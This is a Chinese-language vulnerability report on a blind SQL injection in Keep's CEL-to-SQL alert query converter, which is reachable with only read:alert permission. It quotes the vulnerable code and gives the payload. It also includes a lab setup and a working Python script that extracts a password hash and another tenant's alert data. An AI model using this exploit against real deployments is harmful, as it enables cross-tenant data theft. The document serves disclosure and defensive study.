# Keep 漏洞报告

软件名称：Keep

开发者或厂商：Keephq

代码仓库：https://github.com/keephq/keep

## 1. CEL 查询 SQL 布尔盲注

简要描述：拥有 `read:alert` 权限的账号可以在 CEL 查询的 JSON 下标中实施 SQL 注入。

影响版本：0.34.10 ~ 0.54.3

前置条件：攻击者拥有一个具有 `read:alert` 权限的账号，且至少存在一条告警记录。

### 漏洞成因

Keep 的告警查询接口 `/alerts/query` 接受 CEL 表达式。CEL 的方括号语法用于访问 JSON 字段，方括号内的字符串会成为属性路径的一部分。转换器把这个字符串直接追加进属性路径：

```python
# keep/api/core/cel_to_sql/cel_ast_converter.py:278-288    commit e5cd8698c8
def member_index(self, tree: lark.Tree) -> None:
    right = self.stack.pop()
    left = self.stack.pop()

    if isinstance(right, ConstantNode):
        right = right.value

    prop_access_node: PropertyAccessNode = left
    new_property_access_node = PropertyAccessNode(
        path=prop_access_node.path + [str(right)]
    )
    self.stack.append(new_property_access_node)
    self.member_access_stack.append(new_property_access_node)
```

告警字段映射中存在通配项，未在映射表中显式声明的字段都会落到 `alert.event` 与 `alertenrichment.enrichments` 两个 JSON 列：

```python
# keep/api/core/alerts.py:151-160    commit e5cd8698c8
    FieldMappingConfiguration(
        map_from_pattern="*",
        map_to=[
            "JSON(alertenrichment.enrichments).*",
            "JSON(alert.event).*",
        ],
        data_type=DataType.STRING,
    ),
```

SQL provider 生成 JSON 提取表达式时，把路径片段直接放进单引号字符串，没有做转义。SQLite 的实现如下：

```python
# keep/api/core/cel_to_sql/sql_providers/sqlite.py:16-18    commit e5cd8698c8
def json_extract_as_text(self, column: str, path: list[str]) -> str:
    property_path_str = ".".join([f'"{item}"' for item in path])
    return f"json_extract({column}, '$.{property_path_str}')"
```

PostgreSQL 与 MySQL 的实现分别位于 `keep/api/core/cel_to_sql/sql_providers/postgresql.py:22` 和 `keep/api/core/cel_to_sql/sql_providers/mysql.py:57`，同样没有转义。

因此方括号内的单引号可以闭合 JSON path，后面的内容成为 SQL 片段。以 `alertenrichment.enrichments` 这一列为例，payload `labels["x') OR (1=1) OR ('"]` 在 SQLite 上生成的表达式如下：

```sql
json_extract(alertenrichment.enrichments, '$."labels"."x') OR (1=1) OR ('"')
```

把 `1=1` 换成任意子查询，就得到可用的注入点。

`/incidents?cel=` 使用同一个转换器，并且同样以 `read:alert` 作为鉴权条件，因此该入口也可利用。

### 复现环境搭建

实验环境使用官方 0.54.3 后端镜像，数据库为 SQLite，认证方式为 DB。创建 `docker-compose.yml`：

```yaml
name: keep-vuln
services:
  keep-backend:
    image: us-central1-docker.pkg.dev/keephq/keep/keep-api:0.54.3
    ports:
      - "19611:8080"
    environment:
      - AUTH_TYPE=DB
      - KEEP_JWT_SECRET=reportsecret123
      - KEEP_DEFAULT_USERNAME=admin@lab.local
      - KEEP_DEFAULT_PASSWORD=Admin12345.
      - SECRET_MANAGER_TYPE=FILE
      - SECRET_MANAGER_DIRECTORY=/state
      - DATABASE_CONNECTION_STRING=sqlite:////state/db.sqlite3?check_same_thread=False
    volumes:
      - ./state:/state
```

启动后端：

```bash
mkdir -p state
docker compose up -d
```

后端监听 `http://127.0.0.1:19611`。启动后创建管理员和只读账号，并写入一点 alert 数据：

```python
import time

import httpx
import jwt

BASE = "http://127.0.0.1:19611"
SECRET = "reportsecret123"

admin = httpx.post(
    BASE + "/signin",
    json={"username": "admin@lab.local", "password": "Admin12345."},
).json()["accessToken"]
headers = {"Authorization": f"Bearer {admin}"}
httpx.post(
    BASE + "/auth/users",
    headers=headers,
    json={
        "email": "noc@lab.local",
        "name": "noc",
        "password": "Noc12345.",
        "role": "noc",
    },
)
victim = jwt.encode(
    {"tenant_id": "victim-tenant", "email": "victim@lab.local", "role": "admin"},
    SECRET,
    algorithm="HS256",
)
httpx.post(
    BASE + "/alerts/event",
    headers={"Authorization": f"Bearer {victim}"},
    json={
        "name": "victim-secret-alert",
        "status": "firing",
        "severity": "critical",
        "message": "tenant-victim-confidential",
    },
)
httpx.post(
    BASE + "/alerts/event",
    headers=headers,
    json={
        "name": "attacker-alert",
        "status": "firing",
        "severity": "info",
        "message": "attacker-normal",
    },
)
time.sleep(3)
```

### 复现过程

以 `noc@lab.local` 登录，向 `/alerts/query` 发送 CEL 查询。脚本如下：

```python
import string

import httpx

BASE = "http://127.0.0.1:19611"


def login(username, password):
    r = httpx.post(
        BASE + "/signin",
        json={"username": username, "password": password},
        timeout=30,
    )
    r.raise_for_status()
    return {"Authorization": f"Bearer {r.json()['accessToken']}"}


attacker = login("noc@lab.local", "Noc12345.")
print("attacker tenant:", httpx.get(BASE + "/whoami", headers=attacker).json()["tenant_id"])


def oracle(sql):
    cel = "labels[\"x') OR (" + sql + ") OR ('\"]"
    r = httpx.post(
        BASE + "/alerts/query",
        headers=attacker,
        json={"cel": cel, "limit": 1, "offset": 0},
        timeout=30,
    )
    r.raise_for_status()
    return r.json()["count"] > 0


def extract(column, table, length, where=""):
    alphabet = "$./_-" + string.ascii_letters + string.digits
    out = ""
    for i in range(1, length + 1):
        for ch in alphabet:
            sql = (
                f"(SELECT substr({column},{i},1) FROM {table}"
                f" {where} LIMIT 1)='{ch}'"
            )
            if oracle(sql):
                out += ch
                break
        else:
            out += "?"
    return out


print(
    "victim tenant has alerts:",
    oracle("SELECT count(*) FROM lastalert WHERE tenant_id='victim-tenant'"),
)
print(
    "nonexistent tenant has alerts:",
    oracle("SELECT count(*) FROM lastalert WHERE tenant_id='does-not-exist'"),
)
print("password hash:", extract("password_hash", "user", 16))
print(
    "victim message:",
    extract(
        "json_extract(event,'$.message')",
        "alert",
        len("tenant-victim-confidential"),
        "WHERE tenant_id='victim-tenant'",
    ),
)
```

运行结果如下：

```text
attacker tenant: keep
victim tenant has alerts: True
nonexistent tenant has alerts: False
password hash: f99bc9050b3f95d8
victim message: tenant-victim-confidential
```

